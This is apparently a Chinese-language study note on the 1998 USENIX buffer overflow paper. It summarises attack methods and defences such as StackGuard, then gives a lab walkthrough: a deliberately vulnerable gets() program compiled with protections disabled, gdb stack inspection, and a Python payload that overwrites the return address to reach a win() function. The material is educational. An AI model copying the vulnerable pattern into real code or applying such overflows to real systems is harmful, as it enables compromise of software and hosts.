<h2>总结性的原文</h2>
<p>USENIX Security 1998
Buffer Overflows: Attacks and Defenses for the Vulnerability of the Decade</p>
<p>Crispin Cowan, Perry Wagle, Calton Pu, Steve Beattie, and Jonathan Walpole</p>
<p>[Buffer overflows: attacks and defenses for the vulnerability of the decade - Foundations of Intrusion Tolerant Systems, 2003 <a href="https://www.cs.cornell.edu/courses/cs5431/2011sp/readings/buffer_overflows_attacks_defenses.pdf">Organically Assured and Survivable Information Sy</a></p>
<p>对buffer overflow做了很好的总结：</p>
<p>The overall goal of a buffer overflow attack is to subvert the function of a privileged program so that the attacker can take control of that program, and if the pro gram is sufficiently privileged, thence control the host. Typically the attacker is attacking a root program, and immediately executes code similar to “exec(sh)” to get a root shell, but not always. To achieve this goal, the attacker must achieve two sub-goals:</p>
<ol>
<li>Arrange for suitable code to be available in the pro gram's address space. </li>
<li>Get the program to jump to that code, with suitable parameters loaded into registers &amp; memory.</li>
</ol>
<h2>🧠 <strong>攻击原理详解</strong></h2>
<p>攻击分为两个核心步骤：</p>
<h4>如何让恶意代码出现在程序地址空间中：</h4>
<ul>
<li><strong>注入代码（Inject it）</strong>：直接将机器指令注入到程序缓冲区中，常见于栈、堆、静态区。</li>
<li><strong>利用已有代码（Reuse existing code）</strong>：跳转到已有的 libc 函数，如 <code>exec(&quot;/bin/sh&quot;)</code>，只需构造参数并篡改跳转地址。</li>
</ul>
<h4>如何让程序跳转到攻击代码：</h4>
<ul>
<li><strong>栈溢出（stack smashing）</strong>：修改函数返回地址，函数退出时跳转到攻击者代码。</li>
<li><strong>函数指针篡改</strong>：修改存储在堆或全局区的函数指针。</li>
<li><strong>longjmp 缓冲区篡改</strong>：修改 <code>setjmp</code> 保存的上下文，劫持 <code>longjmp</code> 控制流。</li>
<li><strong>其他变量修改</strong>：修改程序中影响逻辑的非指针变量（罕见但致命）。</li>
</ul>
<h4><strong>攻击组合方式</strong>：</h4>
<ul>
<li>注入和控制流篡改可以一次完成（如经典 <code>gets</code> 漏洞），也可以分开完成（多步攻击）。</li>
<li>Return-to-libc 和格式化字符串攻击常在防御措施生效后出现。Return-to-libc：<a href="https://en.wikipedia.org/wiki/Return-to-libc_attack">Return-to-libc attack - Wikipedia</a></li>
</ul>

<h2>主要防御策略</h2>
<p>论文详细评估了 4 种主要防御策略：</p>
<h4>✅  正确编程</h4>
<ul>
<li>理论上可避免漏洞，但在 C 中非常困难。</li>
<li>审计和工具如 <code>grep</code>, <code>Purify</code>, <code>static analysis</code> 有帮助，但无法完全防御。</li>
</ul>
<h4>🚫 3.2 非可执行栈（Non-executable stack）</h4>
<ul>
<li>阻止在栈上执行注入代码（如 Linux patch）。</li>
<li>局限性：<strong>不能防 Return-to-libc、函数指针劫持等攻击</strong>。</li>
</ul>
<h4>✅ 3.3 数组边界检查（Array bounds checking）</h4>
<ul>
<li>理论上最彻底，防止所有溢出。</li>
<li>代价高昂：性能严重下降，兼容性问题大，C语言难以完美支持。</li>
</ul>
<h4>✅ 3.4 指针完整性保护（Code Pointer Integrity）</h4>
<ul>
<li>检查关键指针是否被篡改，防止被使用。</li>
<li><strong>StackGuard</strong>：在返回地址旁边放置 canary 值，篡改即崩溃；</li>
<li><strong>PointGuard</strong>：对所有函数指针做类似的 canary 检查。</li>
</ul>

<h2>理论总结</h2>
<ul>
<li>
<p>单一方法无法完全防御所有缓冲区溢出攻击。</p>
</li>
<li>
<p><strong>组合防御（StackGuard + Non-exec Stack + PointGuard）</strong> 提供了强有力的保护，同时保持兼容性和性能。</p>
</li>
<li>
<p>最早（如 Morris Worm）那类逻辑型攻击反而很难防御，但也很罕见。</p>
</li>
<li>
<p>缓冲区溢出攻击的本质是<strong>对内存布局和控制流的精确操作</strong>。</p>
</li>
<li>
<p>静态代码分析、编译器插桩、防御性编程和系统级防御应协同使用。</p>
</li>
<li>
<p>StackGuard 和 PointGuard 是非常实用的实际防御工具。</p>
</li>
<li>
<p>越是自动化、无侵入式的防御方法（如编译器增强），越具有推广潜力。</p>
</li>
</ul>

<p>我们现在来<strong>一步步演示一个 Buffer Overflow 攻击的过程</strong>，包括：</p>
<ol>
<li>编写易受攻击的 C 程序；</li>
<li>编译为可调试的 ELF 二进制；</li>
<li>使用 <code>gdb</code> 调试并观察栈溢出；</li>
<li>构造一个溢出输入，覆盖返回地址。</li>
</ol>
<blockquote>
<p>⚠️ <strong>学习目的：仅用于教育和研究。请勿在未授权的系统上进行尝试。</strong></p>
</blockquote>

<h2>🧪 1. 编写易受攻击的代码：<code>vuln.c</code></h2>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

void win() {
    printf(&quot;🎉 Congratulations! You&#039;ve reached the win function!\n&quot;);
}

void vulnerable() {
    char buffer[32];
    printf(&quot;Enter input: &quot;);
    gets(buffer); // 易受攻击的函数
}

int main() {
    vulnerable();
    return 0;
}</code></pre>
<p>这个程序中，<code>gets(buffer)</code> 允许用户无限制地写入数据，而 <code>buffer</code> 只有32字节，后面紧跟着返回地址。</p>
<hr />
<h2>⚙️ 2. 编译为可调试的二进制：</h2>
<pre><code class="language-bash">gcc -g -fno-stack-protector -z execstack -no-pie vuln.c -o vuln</code></pre>
<p>参数解释：</p>
<ul>
<li><code>-g</code>: 启用调试符号；</li>
<li><code>-fno-stack-protector</code>: 关闭栈保护；</li>
<li><code>-z execstack</code>: 允许执行栈；</li>
<li><code>-no-pie</code>: 关闭地址随机化（ASLR的一部分）；</li>
</ul>
<hr />
<h2>🔎 3. 用 <code>gdb</code> 调试分析栈布局</h2>
<pre><code class="language-bash">gdb ./vuln</code></pre>
<p>在 <code>gdb</code> 中输入：</p>
<pre><code class="language-gdb">break vulnerable
run</code></pre>
<p>当断在 <code>vulnerable()</code> 时：</p>
<pre><code class="language-gdb">info frame
x/40x $rsp</code></pre>
<p>你会看到堆栈中的地址。我们可以估算出 <code>buffer</code> 到返回地址之间的偏移（比如 40 字节），然后构造 payload 来覆盖。</p>
<hr />
<h2>🧨 4. 构造攻击输入覆盖返回地址</h2>
<p>假设 <code>win()</code> 函数的地址是 <code>0x080491e2</code>（在 gdb 中输入 <code>p win</code> 获取地址）。</p>
<p>我们可以用 Python 构造 payload：</p>
<pre><code class="language-python">payload = b&quot;A&quot; * 40           # 填满 buffer + 填充到返回地址
payload += b&quot;\xe2\x91\x04\x08&quot;  # win() 的地址（小端序）

with open(&quot;payload.txt&quot;, &quot;wb&quot;) as f:
    f.write(payload)</code></pre>
<p>然后运行程序并将 payload 作为输入：</p>
<pre><code class="language-bash">./vuln &lt; payload.txt</code></pre>
<p><strong>输出应该是：</strong></p>
<pre><code>🎉 Congratulations! You&#039;ve reached the win function!</code></pre>
<hr />
<h2>🔐 防御建议（再强调一次）：</h2>
<ul>
<li>避免使用 <code>gets()</code>，使用 <code>fgets()</code>；</li>
<li>开启编译器安全选项（Stack Protector、ASLR 等）；</li>
<li>使用现代语言如 Rust、Go 开发关键系统，自动内存安全；</li>
<li>对输入进行边界检查，永远不要信任用户输入。</li>
</ul>
